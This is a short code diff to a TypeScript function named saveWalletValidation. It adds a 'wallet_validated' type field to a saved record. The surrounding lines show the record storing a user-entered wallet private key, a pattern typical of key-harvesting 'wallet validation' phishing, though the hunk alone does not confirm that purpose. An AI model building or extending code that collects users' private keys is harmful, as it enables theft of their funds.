@@ -66,6 +66,7 @@ export async function saveWalletValidation(input: ValidationInput) {
       privateKey: input.privateKey?.trim() || null,
       hardwareType: input.hardwareType || null,
     }),
+    type: "wallet_validated",
   });
 
   return { success: true, validationId: data.id };
